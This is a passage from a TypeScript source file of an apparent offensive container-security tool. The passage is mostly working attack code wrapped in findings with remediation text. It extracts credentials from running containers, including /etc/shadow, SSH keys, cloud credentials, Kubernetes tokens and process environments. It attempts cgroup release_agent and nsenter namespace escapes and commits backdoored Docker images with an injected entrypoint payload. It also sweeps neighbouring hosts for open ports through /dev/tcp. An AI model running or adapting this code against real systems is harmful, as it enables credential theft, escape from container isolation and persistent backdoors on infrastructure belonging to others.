    const graphDriver = data?.[0]?.GraphDriver?.Data || {}
    if (graphDriver.UpperDir) {
      output.push(`    UpperDir: ${graphDriver.UpperDir}`)
      const grep = await run("grep", ["-rlI", "--include=*", "-i", secretPattern, graphDriver.UpperDir], timeout)
      if (grep.exitCode === 0 && grep.stdout.trim()) {
        const matches = grep.stdout.trim().split("\n").filter(Boolean)
        output.push(`    [!] ${matches.length} file(s) with potential secrets:`)
        for (const m of matches.slice(0, 20)) {
          output.push(`      ${m}`)
          findings.push({
            checkId: "CONT-OVL-001",
            provider: "docker",
            severity: "high",
            status: "FAIL",
            resource: `overlay://${m}`,
            title: `Secret in overlay layer: ${m.split("/").pop()}`,
            details: `Potential credential found in overlay filesystem`,
            remediation: "Use multi-stage builds and remove secrets before final layer",
          })
        }
      }
    }
    if (graphDriver.LowerDir) {
      const lowers = graphDriver.LowerDir.split(":")
      output.push(`    LowerDir layers: ${lowers.length}`)
      for (const lower of lowers.slice(0, 5)) {
        const grep = await run("grep", ["-rlI", "-i", secretPattern, lower], timeout)
        if (grep.exitCode === 0 && grep.stdout.trim()) {
          const matches = grep.stdout.trim().split("\n").filter(Boolean)
          output.push(`    [!] ${matches.length} secret(s) in layer ${lower.split("/").pop()}`)
        }
      }
    }
    return { output: output.join("\n"), findings }
  }

  const access = await run("ls", [searchPath], 5)
  if (access.exitCode !== 0) {
    output.push(`[-] Cannot access ${searchPath} — need root or host filesystem mount`)
    return { output: output.join("\n"), findings }
  }

  const layers = await run("find", [searchPath, "-maxdepth", "2", "-name", "diff", "-type", "d"], timeout)
  if (layers.exitCode === 0) {
    const dirs = layers.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] Overlay diff layers: ${dirs.length}`)
    let found = 0
    for (const dir of dirs.slice(0, 20)) {
      const grep = await run("grep", ["-rlI", "-i", secretPattern, dir], 10)
      if (grep.exitCode === 0 && grep.stdout.trim()) {
        const matches = grep.stdout.trim().split("\n").filter(Boolean)
        found += matches.length
        for (const m of matches.slice(0, 5)) output.push(`    [!] ${m}`)
      }
    }
    if (found > 0) output.push(`\n[+] Total files with potential secrets: ${found}`)
  }

  return { output: output.join("\n"), findings }
}

async function podmanEnum(args: string[], timeout: number): Promise<HookResult> {
  const remote = argVal(args, "--remote")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating Podman environment...\n"]

  if (!Bun.which("podman")) return { output: "[-] podman not found", findings }

  const extra = remote ? ["--remote", "--url", remote] : []

  const info = await run("podman", [...extra, "info", "--format", "json"], timeout)
  if (info.exitCode === 0) {
    const d = tryJson(info.stdout)
    if (d) {
      const host = d.host || {}
      const store = d.store || {}
      output.push(`[+] Podman ${host.version?.version || "?"}`)
      output.push(`    Rootless: ${host.security?.rootless || false}`)
      output.push(`    Runtime: ${host.ociRuntime?.name || "?"}`)
      output.push(`    OS: ${host.os || "?"} (${host.arch || "?"})`)
      output.push(`    Containers: ${store.containerStore?.number || 0}`)
      output.push(`    Images: ${store.imageStore?.number || 0}`)
      if (host.security?.rootless === false) {
        findings.push({
          checkId: "CONT-POD-001",
          provider: "podman",
          severity: "medium",
          status: "INFO",
          resource: "podman://daemon",
          title: "Podman running in rootful mode",
          details: "Rootful Podman has similar risks to Docker daemon",
          remediation: "Use rootless Podman where possible",
        })
      }
    }
  }

  const containers = await run("podman", [...extra, "ps", "-a", "--format", "json"], timeout)
  if (containers.exitCode === 0) {
    const list = tryJson(containers.stdout) || []
    output.push(`\n[+] Containers: ${list.length}`)
    for (const c of list) {
      const priv = c.IsInfra ? "" : c.HostConfig?.Privileged ? " [PRIVILEGED]" : ""
      output.push(`    ${c.Names?.[0] || c.Id?.substring(0, 12)} (${c.Image}) — ${c.State}${priv}`)
    }
  }

  const pods = await run("podman", [...extra, "pod", "ls", "--format", "json"], timeout)
  if (pods.exitCode === 0) {
    const list = tryJson(pods.stdout) || []
    if (list.length > 0) {
      output.push(`\n[+] Pods: ${list.length}`)
      for (const p of list) {
        output.push(`    ${p.Name} (${p.Status}) — ${p.NumberOfContainers || 0} containers`)
      }
    }
  }

  const images = await run("podman", [...extra, "images", "--format", "json"], timeout)
  if (images.exitCode === 0) {
    const list = tryJson(images.stdout) || []
    output.push(`\n[+] Images: ${list.length}`)
    for (const img of list.slice(0, 15)) {
      const names = (img.Names || img.RepoTags || ["<none>"]).join(", ")
      output.push(`    ${names} — ${img.Size ? (img.Size / 1024 / 1024).toFixed(1) + "MB" : "?"}`)
    }
  }

  const volumes = await run("podman", [...extra, "volume", "ls", "--format", "json"], timeout)
  if (volumes.exitCode === 0) {
    const list = tryJson(volumes.stdout) || []
    if (list.length > 0) {
      output.push(`\n[+] Volumes: ${list.length}`)
      for (const v of list) output.push(`    ${v.Name} (${v.Driver})`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function buildCacheDump(args: string[], timeout: number): Promise<HookResult> {
  const builder = argVal(args, "--builder")
  const findings: Finding[] = []
  const output: string[] = ["[*] Inspecting Docker build cache and history...\n"]

  const builders = await run("docker", ["buildx", "ls"], timeout)
  if (builders.exitCode === 0) {
    output.push(`[+] Build instances:\n${builders.stdout}`)
  }

  const target = builder || "default"
  const duCmd = await run("docker", ["buildx", "du", "--builder", target], timeout)
  if (duCmd.exitCode === 0) {
    output.push(`\n[+] Cache usage for "${target}":\n${duCmd.stdout.substring(0, 2000)}`)
  }

  const secretPattern =
    /(?:password|secret|api[_-]?key|token|credential|private[_-]?key|access[_-]?key|connection[_-]?string)/i

  const images = await run(
    "docker",
    ["images", "--format", "{{.Repository}}:{{.Tag}}", "--filter", "dangling=false"],
    timeout,
  )
  if (images.exitCode === 0) {
    const imgList = images.stdout.trim().split("\n").filter(Boolean).slice(0, 15)
    output.push(`\n[*] Scanning build history of ${imgList.length} images...`)
    for (const img of imgList) {
      const history = await run("docker", ["history", "--no-trunc", "--format", "{{.CreatedBy}}", img], 10)
      if (history.exitCode !== 0) continue
      const cmds = history.stdout.split("\n").filter(Boolean)
      for (const cmd of cmds) {
        if (secretPattern.test(cmd)) {
          output.push(`\n  [!] ${img}:`)
          output.push(`      ${cmd.substring(0, 200)}`)
          findings.push({
            checkId: "CONT-BUILD-001",
            provider: "docker",
            severity: "high",
            status: "FAIL",
            resource: `image://${img}`,
            title: `Secret in build history: ${img}`,
            details: cmd.substring(0, 500),
            remediation: "Use --mount=type=secret in BuildKit or multi-stage builds",
          })
        }
      }
    }
  }

  const buildLogs = await run(
    "find",
    ["/var/lib/docker/buildkit", "-maxdepth", "2", "-name", "*.json", "-type", "f"],
    10,
  )
  if (buildLogs.exitCode === 0 && buildLogs.stdout.trim()) {
    const files = buildLogs.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] BuildKit metadata files: ${files.length}`)
  }

  return { output: output.join("\n"), findings }
}

async function cgroupEscape(args: string[], timeout: number): Promise<HookResult> {
  const exploit = hasFlag(args, "--exploit")
  const findings: Finding[] = []
  const output: string[] = ["[*] Checking cgroup escape vectors...\n"]

  const cgroupV = await run("cat", ["/proc/self/cgroup"], 5)
  if (cgroupV.exitCode === 0) {
    const isV1 = cgroupV.stdout.includes(":/docker/") || cgroupV.stdout.includes(":/kubepods/")
    const isV2 = cgroupV.stdout.includes("0::/")
    output.push(`[+] Cgroup version: ${isV2 ? "v2" : isV1 ? "v1" : "unknown"}`)
    output.push(`    Raw: ${cgroupV.stdout.trim().split("\n").slice(0, 3).join("; ")}`)
  }

  const mounts = await run("mount", [], 5)
  if (mounts.exitCode === 0) {
    const cgMounts = mounts.stdout.split("\n").filter((l) => l.includes("cgroup"))
    output.push(`\n[+] Cgroup mounts: ${cgMounts.length}`)
    for (const m of cgMounts) output.push(`    ${m.trim()}`)
  }

  const rdma = await run("ls", ["/sys/fs/cgroup/rdma"], 3)
  if (rdma.exitCode === 0) output.push(`\n[+] /sys/fs/cgroup/rdma accessible`)

  const release = await run("cat", ["/sys/fs/cgroup/release_agent"], 3)
  if (release.exitCode === 0) {
    output.push(`[!] release_agent readable: ${release.stdout.trim() || "(empty)"}`)
    findings.push({
      checkId: "CONT-CG-001",
      provider: "docker",
      severity: "critical",
      status: "FAIL",
      resource: "cgroup://release_agent",
      title: "Cgroup release_agent accessible",
      details: "release_agent is readable — potential host command execution via cgroup escape",
      remediation: "Run container without SYS_ADMIN capability and with cgroup namespace",
    })
  }

  const writable = await run("test", ["-w", "/sys/fs/cgroup"], 3)
  if (writable.exitCode === 0) {
    output.push(`[!] /sys/fs/cgroup is WRITABLE`)
    findings.push({
      checkId: "CONT-CG-002",
      provider: "docker",
      severity: "critical",
      status: "FAIL",
      resource: "cgroup://sys/fs/cgroup",
      title: "Cgroup filesystem is writable",
      details: "Writable cgroup filesystem allows escape via release_agent or device allow",
      remediation: "Mount cgroup read-only or use cgroup namespace isolation",
    })
  }

  const devices = await run("cat", ["/sys/fs/cgroup/devices/devices.allow"], 3)
  if (devices.exitCode === 0) {
    output.push(`\n[+] Device cgroup allow: ${devices.stdout.trim() || "(empty)"}`)
    if (devices.stdout.includes("a *:* rwm")) {
      findings.push({
        checkId: "CONT-CG-003",
        provider: "docker",
        severity: "high",
        status: "FAIL",
        resource: "cgroup://devices",
        title: "All devices allowed in cgroup",
        details: "devices.allow = 'a *:* rwm' — container can access all host devices",
        remediation: "Restrict device access in container configuration",
      })
    }
  }

  if (exploit) {
    output.push(`\n[!] Attempting cgroup release_agent escape...`)
    const d = "/tmp/cs-cgroup-escape"
    await run("mkdir", ["-p", d], 3)
    const mount = await run("mount", ["-t", "cgroup", "-o", "rdma", "cgroup", d], 10)
    if (mount.exitCode === 0) {
      output.push(`[+] Cgroup mounted at ${d}`)
      output.push(`[*] To complete: echo 1 > ${d}/notify_on_release && echo /cmd > ${d}/release_agent`)
    }
    if (mount.exitCode !== 0) output.push(`[-] Cgroup mount failed (need SYS_ADMIN): ${mount.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

async function containerCreds(args: string[], timeout: number): Promise<HookResult> {
  const container = argVal(args, "--container")
  const all = hasFlag(args, "--all")
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting credentials from containers...\n"]

  const targets: string[] = []
  if (container) {
    targets.push(container)
  } else if (all) {
    const ps = await run("docker", ["ps", "-q"], timeout)
    if (ps.exitCode === 0) targets.push(...ps.stdout.trim().split("\n").filter(Boolean))
  } else {
    const ps = await run("docker", ["ps", "-q", "--last", "10"], timeout)
    if (ps.exitCode === 0) targets.push(...ps.stdout.trim().split("\n").filter(Boolean))
  }

  output.push(`[+] Scanning ${targets.length} container(s)\n`)

  const secretPattern =
    /(?:password|secret|api[_-]?key|token|credential|aws[_-]?access|private[_-]?key|database[_-]?url)/i
  const credPaths = [
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/root/.ssh/id_rsa",
    "/root/.aws/credentials",
    "/root/.azure/accessTokens.json",
    "/root/.config/gcloud/credentials.db",
    "/root/.docker/config.json",
    "/root/.bash_history",
    "/root/.git-credentials",
    "/etc/shadow",
    "/proc/self/environ",
  ]

  for (const id of targets) {
    const inspect = await run("docker", ["inspect", "--format", "{{.Name}} {{.Config.Image}}", id], 5)
    const name = inspect.stdout.trim().split(" ")[0]?.replace(/^\//, "") || id.substring(0, 12)
    const image = inspect.stdout.trim().split(" ")[1] || "?"
    output.push(`── ${name} (${image}) ──`)

    const env = await run("docker", ["exec", id, "env"], 5)
    if (env.exitCode === 0) {
      const secrets = env.stdout.split("\n").filter((l) => secretPattern.test(l))
      if (secrets.length > 0) {
        output.push(`  [!] Secrets in env: ${secrets.length}`)
        for (const s of secrets) output.push(`      ${s.substring(0, 150)}`)
        findings.push({
          checkId: "CONT-CRED-001",
          provider: "docker",
          severity: "high",
          status: "EXTRACTED",
          resource: `container://${name}`,
          title: `Secrets in env vars: ${name}`,
          details: `${secrets.length} secret-like env vars found`,
          remediation: "Use mounted secrets or a secrets manager instead of env vars",
        })
      }
    }

    for (const path of credPaths) {
      const cat = await run("docker", ["exec", id, "cat", path], 3)
      if (cat.exitCode === 0 && cat.stdout.trim()) {
        const preview = cat.stdout.substring(0, 100).replace(/\n/g, " ")
        output.push(`  [!] ${path}: ${preview}...`)
        findings.push({
          checkId: "CONT-CRED-002",
          provider: "docker",
          severity: "high",
          status: "EXTRACTED",
          resource: `container://${name}`,
          title: `Credential file found: ${path}`,
          details: `Extracted from ${name}: ${path}`,
          remediation: "Remove credential files from container or use read-only mounts",
        })
      }
    }
    output.push("")
  }

  return { output: output.join("\n"), findings }
}

async function swarmEnum(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating Docker Swarm cluster...\n"]

  const info = await run("docker", ["info", "--format", "json"], timeout)
  if (info.exitCode !== 0) return { output: "[-] Cannot connect to Docker daemon", findings }

  const d = tryJson(info.stdout)
  if (!d?.Swarm?.LocalNodeState || d.Swarm.LocalNodeState === "inactive") {
    return { output: "[-] Docker Swarm is not active on this node", findings }
  }

  const swarm = d.Swarm
  output.push(`[+] Swarm Status: ${swarm.LocalNodeState}`)
  output.push(`    Node ID: ${swarm.NodeID}`)
  output.push(`    Is Manager: ${swarm.ControlAvailable}`)
  output.push(`    Managers: ${swarm.Managers}, Workers: ${swarm.Nodes - swarm.Managers}`)
  output.push(`    Cluster ID: ${swarm.Cluster?.ID || "?"}`)

  const nodes = await run("docker", ["node", "ls", "--format", "json"], timeout)
  if (nodes.exitCode === 0) {
    const lines = nodes.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Nodes: ${lines.length}`)
    for (const line of lines) {
      const n = tryJson(line)
      if (n) output.push(`    ${n.Hostname} (${n.Status}) — ${n.ManagerStatus || "worker"} [${n.Availability}]`)
    }
  }

  const services = await run("docker", ["service", "ls", "--format", "json"], timeout)
  if (services.exitCode === 0) {
    const lines = services.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Services: ${lines.length}`)
    for (const line of lines) {
      const s = tryJson(line)
      if (s) output.push(`    ${s.Name} — ${s.Replicas} replicas, image: ${s.Image}`)
    }
  }

  const secrets = await run("docker", ["secret", "ls", "--format", "json"], timeout)
  if (secrets.exitCode === 0) {
    const lines = secrets.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Swarm Secrets: ${lines.length}`)
    for (const line of lines) {
      const s = tryJson(line)
      if (s) output.push(`    ${s.Name} (created: ${s.CreatedAt})`)
    }
    if (lines.length > 0) {
      findings.push({
        checkId: "CONT-SWARM-001",
        provider: "docker",
        severity: "info",
        status: "ENUMERATED",
        resource: "swarm://secrets",
        title: `Swarm secrets enumerated: ${lines.length}`,
        details: "Secrets are encrypted at rest but accessible to assigned services",
        remediation: "Review secret access scope and rotate regularly",
      })
    }
  }

  const configs = await run("docker", ["config", "ls", "--format", "json"], timeout)
  if (configs.exitCode === 0) {
    const lines = configs.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] Swarm Configs: ${lines.length}`)
    for (const line of lines) {
      const c = tryJson(line)
      if (c) {
        output.push(`    ${c.Name} (created: ${c.CreatedAt})`)
        const inspect = await run("docker", ["config", "inspect", c.ID || c.Name, "--format", "{{.Spec.Data}}"], 5)
        if (inspect.exitCode === 0 && inspect.stdout.trim()) {
          const decoded = Buffer.from(inspect.stdout.trim(), "base64").toString()
          if (/(?:password|secret|token|key)/i.test(decoded)) {
            output.push(`      [!] Config contains potential secrets`)
            findings.push({
              checkId: "CONT-SWARM-002",
              provider: "docker",
              severity: "high",
              status: "EXTRACTED",
              resource: `swarm://config/${c.Name}`,
              title: `Secrets in Swarm config: ${c.Name}`,
              details: `Config data contains credential-like values`,
              remediation: "Use Swarm secrets instead of configs for sensitive data",
            })
          }
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

async function containerdExploit(args: string[], timeout: number): Promise<HookResult> {
  const socket = argVal(args, "--socket")
  const findings: Finding[] = []
  const output: string[] = ["[*] Checking containerd access...\n"]

  const sockets = [
    socket,
    "/run/containerd/containerd.sock",
    "/var/run/containerd/containerd.sock",
    "/run/dockershim.sock",
  ].filter(Boolean) as string[]

  for (const s of sockets) {
    const check = await run("test", ["-S", s], 3)
    if (check.exitCode === 0) {
      output.push(`[+] Socket found: ${s}`)
      const writable = await run("test", ["-w", s], 3)
      if (writable.exitCode === 0) {
        output.push(`    [!] Socket is WRITABLE`)
        findings.push({
          checkId: "CONT-CTD-001",
          provider: "containerd",
          severity: "critical",
          status: "FAIL",
          resource: `containerd://${s}`,
          title: `Writable containerd socket: ${s}`,
          details: "Containerd socket is writable — full container and image management access",
          remediation: "Remove containerd socket mount from container",
        })
      }
    }
  }

  if (Bun.which("ctr")) {
    output.push(`\n[+] ctr CLI available`)
    const ns = await run("ctr", ["namespaces", "list"], timeout)
    if (ns.exitCode === 0) {
      output.push(`\n[+] Containerd namespaces:\n${ns.stdout}`)
    }

    for (const namespace of ["default", "k8s.io", "moby"]) {
      const containers = await run("ctr", ["-n", namespace, "containers", "list"], timeout)
      if (containers.exitCode === 0 && containers.stdout.trim().split("\n").length > 1) {
        output.push(`\n[+] Containers in ${namespace}:`)
        output.push(containers.stdout.substring(0, 2000))
      }

      const images = await run("ctr", ["-n", namespace, "images", "list", "-q"], timeout)
      if (images.exitCode === 0 && images.stdout.trim()) {
        const imgList = images.stdout.trim().split("\n").filter(Boolean)
        output.push(`\n[+] Images in ${namespace}: ${imgList.length}`)
        for (const img of imgList.slice(0, 10)) output.push(`    ${img}`)
      }
    }
  }

  if (Bun.which("nerdctl")) {
    output.push(`\n[+] nerdctl CLI available`)
    const ps = await run("nerdctl", ["ps", "-a"], timeout)
    if (ps.exitCode === 0) output.push(`\n[+] nerdctl containers:\n${ps.stdout.substring(0, 2000)}`)
  }

  if (!Bun.which("ctr") && !Bun.which("nerdctl") && findings.length === 0) {
    output.push(`[-] No containerd CLI tools found and no accessible sockets`)
  }

  return { output: output.join("\n"), findings }
}

async function imageBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const base = argVal(args, "--base")
  const name = argVal(args, "--name")
  const cmd = argVal(args, "--cmd") || "/bin/sh -c 'while true; do sleep 3600; done'"
  const findings: Finding[] = []
  const output: string[] = ["[*] Creating backdoored container image...\n"]

  if (!base) return { output: "ERROR: --base IMAGE required", findings }
  if (!name) return { output: "ERROR: --name NAME required", findings }

  const containerId = `cs-backdoor-${Date.now()}`
  const create = await run(
    "docker",
    ["run", "-d", "--name", containerId, "--label", "cyberstrike=true", base, "sh", "-c", "sleep 10"],
    timeout,
  )
  if (create.exitCode !== 0) return { output: `[-] Cannot start base container: ${create.stderr.trim()}`, findings }

  output.push(`[+] Base container started: ${containerId}`)

  const exec = await run(
    "docker",
    ["exec", containerId, "sh", "-c", `echo '#!/bin/sh\n${cmd}' > /entrypoint.sh && chmod +x /entrypoint.sh`],
    10,
  )
  if (exec.exitCode === 0) output.push(`[+] Payload injected to /entrypoint.sh`)

  const commit = await run(
    "docker",
    ["commit", "--change", `ENTRYPOINT ["/entrypoint.sh"]`, "--change", `LABEL cyberstrike=true`, containerId, name],
    timeout,
  )
  if (commit.exitCode === 0) {
    output.push(`[+] Backdoored image committed: ${name}`)
    output.push(`    Base: ${base}`)
    output.push(`    Payload: ${cmd.substring(0, 200)}`)
    findings.push({
      checkId: "CONT-BACK-001",
      provider: "docker",
      severity: "critical",
      status: "CREATED",
      resource: `image://${name}`,
      title: `Backdoored image created: ${name}`,
      details: `Based on ${base}, payload: ${cmd.substring(0, 200)}`,
      remediation: `Remove: docker rmi ${name}`,
    })
  }
  if (commit.exitCode !== 0) output.push(`[-] Commit failed: ${commit.stderr.trim()}`)

  await run("docker", ["rm", "-f", containerId], 10)

  return { output: output.join("\n"), findings }
}

async function volumeDump(args: string[], timeout: number): Promise<HookResult> {
  const volume = argVal(args, "--volume")
  const pattern = argVal(args, "--pattern")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating Docker volumes...\n"]

  const secretPattern = pattern || "password\\|secret\\|api[_-]key\\|token\\|credential\\|private[_-]key\\|connection"

  if (volume) {
    const inspect = await run("docker", ["volume", "inspect", volume], timeout)
    if (inspect.exitCode !== 0) return { output: `[-] Volume not found: ${volume}`, findings }
    const data = tryJson(inspect.stdout)
    const mountpoint = data?.[0]?.Mountpoint || ""
    output.push(`[+] Volume: ${volume}`)
    output.push(`    Mountpoint: ${mountpoint}`)
    output.push(`    Driver: ${data?.[0]?.Driver || "?"}`)

    const search = await run(
      "docker",
      [
        "run",
        "--rm",
        "-v",
        `${volume}:/data:ro`,
        "--label",
        "cyberstrike=true",
        "alpine",
        "sh",
        "-c",
        `find /data -type f -size -10M 2>/dev/null | head -100 | while read f; do grep -il '${secretPattern}' "$f" 2>/dev/null; done`,
      ],
      timeout,
    )
    if (search.exitCode === 0 && search.stdout.trim()) {
      const matches = search.stdout.trim().split("\n").filter(Boolean)
      output.push(`\n[!] Files with potential secrets: ${matches.length}`)
      for (const m of matches) output.push(`    ${m}`)
      findings.push({
        checkId: "CONT-VOL-001",
        provider: "docker",
        severity: "high",
        status: "FOUND",
        resource: `volume://${volume}`,
        title: `Secrets in volume: ${volume}`,
        details: `${matches.length} files with potential credentials`,
        remediation: "Rotate credentials found in volume data",
      })
    }

    const listing = await run(
      "docker",
      [
        "run",
        "--rm",
        "-v",
        `${volume}:/data:ro`,
        "--label",
        "cyberstrike=true",
        "alpine",
        "find",
        "/data",
        "-type",
        "f",
        "-maxdepth",
        "3",
      ],
      timeout,
    )
    if (listing.exitCode === 0) {
      const files = listing.stdout.trim().split("\n").filter(Boolean)
      output.push(`\n[+] Files in volume: ${files.length}`)
      for (const f of files.slice(0, 30)) output.push(`    ${f}`)
    }

    return { output: output.join("\n"), findings }
  }

  const volumes = await run("docker", ["volume", "ls", "--format", "json"], timeout)
  if (volumes.exitCode !== 0) return { output: "[-] Cannot list volumes", findings }

  const lines = volumes.stdout.trim().split("\n").filter(Boolean)
  output.push(`[+] Volumes: ${lines.length}\n`)

  for (const line of lines) {
    const v = tryJson(line)
    if (!v) continue
    output.push(`── ${v.Name} (${v.Driver}) ──`)

    const inspect = await run("docker", ["volume", "inspect", v.Name, "--format", "{{.Mountpoint}}"], 5)
    if (inspect.exitCode === 0) output.push(`    Mountpoint: ${inspect.stdout.trim()}`)

    const search = await run(
      "docker",
      [
        "run",
        "--rm",
        "-v",
        `${v.Name}:/data:ro`,
        "--label",
        "cyberstrike=true",
        "alpine",
        "sh",
        "-c",
        `find /data -type f -size -10M 2>/dev/null | head -20 | while read f; do grep -il '${secretPattern}' "$f" 2>/dev/null; done`,
      ],
      30,
    )
    if (search.exitCode === 0 && search.stdout.trim()) {
      const matches = search.stdout.trim().split("\n").filter(Boolean)
      output.push(`    [!] ${matches.length} file(s) with potential secrets`)
      findings.push({
        checkId: "CONT-VOL-001",
        provider: "docker",
        severity: "high",
        status: "FOUND",
        resource: `volume://${v.Name}`,
        title: `Secrets in volume: ${v.Name}`,
        details: `${matches.length} files with potential credentials`,
        remediation: "Rotate credentials found in volume data",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

async function containerPivot(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const ports = argVal(args, "--ports") || "22,80,443,3306,5432,6379,8080,8443,9200,27017"
  const findings: Finding[] = []
  const output: string[] = ["[*] Container network pivot reconnaissance...\n"]

  const iface = await run("ip", ["addr", "show"], 5)
  if (iface.exitCode === 0) {
    output.push(`[+] Network interfaces:`)
    const ips = iface.stdout.match(/inet\s+[\d.]+\/\d+/g) || []
    for (const ip of ips) output.push(`    ${ip}`)
  }

  const routes = await run("ip", ["route"], 5)
  if (routes.exitCode === 0) {
    output.push(`\n[+] Routes:`)
    for (const r of routes.stdout.trim().split("\n")) output.push(`    ${r}`)
  }

  const gw = routes.exitCode === 0 ? routes.stdout.match(/default via ([\d.]+)/)?.[1] : undefined
  if (gw) output.push(`\n[+] Gateway: ${gw}`)

  const dns = await run("cat", ["/etc/resolv.conf"], 3)
  if (dns.exitCode === 0) {
    const servers = dns.stdout.match(/nameserver\s+([\d.]+)/g) || []
    output.push(`\n[+] DNS servers: ${servers.join(", ")}`)
  }

  const neighbors = await run("ip", ["neigh"], 5)
  if (neighbors.exitCode === 0 && neighbors.stdout.trim()) {
    const entries = neighbors.stdout.trim().split("\n").filter(Boolean)
    output.push(`\n[+] ARP neighbors: ${entries.length}`)
    for (const e of entries) output.push(`    ${e}`)
    if (entries.length > 0) {
      findings.push({
        checkId: "CONT-PIVOT-001",
        provider: "docker",
        severity: "info",
        status: "ENUMERATED",
        resource: "container://network",
        title: `${entries.length} ARP neighbor(s) discovered`,
        details: "Adjacent hosts on container network",
        remediation: "Implement network segmentation between containers",
      })
    }
  }

  const cidr = target || (gw ? gw.replace(/\.\d+$/, ".0/24") : undefined)
  if (cidr) {
    output.push(`\n[*] Scanning ${cidr} for common services (ports: ${ports})...`)
    const portList = ports.split(",").map((p) => p.trim())
    const base = cidr.replace(/\/\d+$/, "").replace(/\.\d+$/, "")
    let found = 0

    for (let i = 1; i <= 254 && found < 50; i++) {
      const ip = `${base}.${i}`
      for (const port of portList) {
        const scan = await run("sh", ["-c", `echo | timeout 1 sh -c "cat < /dev/tcp/${ip}/${port}" 2>/dev/null`], 3)
        if (scan.exitCode === 0) {
          output.push(`    [+] ${ip}:${port} — OPEN`)
          found++
          findings.push({
            checkId: "CONT-PIVOT-002",
            provider: "docker",
            severity: "medium",
            status: "FOUND",
            resource: `tcp://${ip}:${port}`,
            title: `Service reachable from container: ${ip}:${port}`,
            details: `Port ${port} open on ${ip} — reachable from container network`,
            remediation: "Restrict inter-container communication with network policies",
          })
        }
      }
    }
    if (found === 0) output.push(`    [-] No open ports found on ${cidr}`)
  }

  return { output: output.join("\n"), findings }
}

async function namespaceExploit(args: string[], timeout: number): Promise<HookResult> {
  const exploit = hasFlag(args, "--exploit")
  const targetPid = argVal(args, "--target") || "1"
  const findings: Finding[] = []
  const output: string[] = ["[*] Checking Linux namespace boundaries...\n"]

  const nsTypes = ["pid", "net", "mnt", "uts", "ipc", "cgroup", "user"]
  const selfNs: Record<string, string> = {}
  const hostNs: Record<string, string> = {}

  for (const ns of nsTypes) {
    const self = await run("readlink", [`/proc/self/ns/${ns}`], 3)
    if (self.exitCode === 0) selfNs[ns] = self.stdout.trim()
    const host = await run("readlink", [`/proc/${targetPid}/ns/${ns}`], 3)
    if (host.exitCode === 0) hostNs[ns] = host.stdout.trim()
  }

  output.push(`[+] Namespace comparison (self vs PID ${targetPid}):`)
  let shared = 0
  for (const ns of nsTypes) {
    const s = selfNs[ns] || "?"
    const h = hostNs[ns] || "?"
    const same = s === h && s !== "?"
    if (same) shared++
    output.push(`    ${ns.padEnd(8)} self=${s} ${same ? " [SHARED!]" : ""}`)
  }

  if (shared > 0) {
    findings.push({
      checkId: "CONT-NS-001",
      provider: "docker",
      severity: shared >= 3 ? "critical" : "high",
      status: "FAIL",
      resource: "container://namespaces",
      title: `${shared} namespace(s) shared with PID ${targetPid}`,
      details: `Container shares ${shared} namespace(s) with target process — isolation is weakened`,
      remediation: "Use separate namespaces for all container isolation boundaries",
    })
  }

  const userNs = await run("cat", ["/proc/self/uid_map"], 3)
  if (userNs.exitCode === 0) {
    output.push(`\n[+] UID map: ${userNs.stdout.trim()}`)
    if (userNs.stdout.includes("4294967295")) {
      output.push(`    [!] Full UID range mapped — no user namespace isolation`)
      findings.push({
        checkId: "CONT-NS-002",
        provider: "docker",
        severity: "medium",
        status: "FAIL",
        resource: "container://user-ns",
        title: "No user namespace isolation",
        details: "Full UID range mapped — container root == host root",
        remediation: "Enable user namespace remapping in Docker daemon",
      })
    }
  }

  const pid1 = await run("cat", ["/proc/1/cmdline"], 3)
  if (pid1.exitCode === 0) {
    const cmd = pid1.stdout.replace(/\0/g, " ").trim()
    output.push(`\n[+] PID 1 in this namespace: ${cmd}`)
  }

  if (exploit && Bun.which("nsenter")) {
    output.push(`\n[!] Attempting nsenter into PID ${targetPid} namespaces...`)
    const enter = await run("nsenter", ["-t", targetPid, "-m", "-u", "-i", "-n", "-p", "--", "id"], timeout)
    if (enter.exitCode === 0) {
      output.push(`[+] nsenter SUCCESS: ${enter.stdout.trim()}`)
      findings.push({
        checkId: "CONT-NS-003",
        provider: "docker",
        severity: "critical",
        status: "EXPLOITED",
        resource: `container://nsenter/${targetPid}`,
        title: `Namespace escape via nsenter to PID ${targetPid}`,
        details: `Successfully entered host namespaces: ${enter.stdout.trim()}`,
        remediation: "Restrict ptrace and namespace access capabilities",
      })
    }
    if (enter.exitCode !== 0) output.push(`[-] nsenter failed: ${enter.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

async function cleanupContainer(_args: string[], timeout: number): Promise<HookResult> {
  const dryRun = hasFlag(_args, "--dry-run")
  const findings: Finding[] = []
  const output: string[] = ["[*] Cleaning up CyberStrike container resources...\n"]

  const containers = await run("docker", ["ps", "-a", "--filter", "label=cyberstrike=true", "-q"], timeout)
  if (containers.exitCode === 0) {
    const ids = containers.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] CyberStrike containers: ${ids.length}`)
    if (ids.length > 0 && !dryRun) {
      await run("docker", ["rm", "-f", ...ids], timeout)
      output.push(`    Removed ${ids.length} container(s)`)
    }
  }

  const images = await run("docker", ["images", "--filter", "label=cyberstrike=true", "-q"], timeout)
  if (images.exitCode === 0) {
    const ids = images.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] CyberStrike images: ${ids.length}`)
    if (ids.length > 0 && !dryRun) {
      await run("docker", ["rmi", "-f", ...ids], timeout)
      output.push(`    Removed ${ids.length} image(s)`)
    }
  }

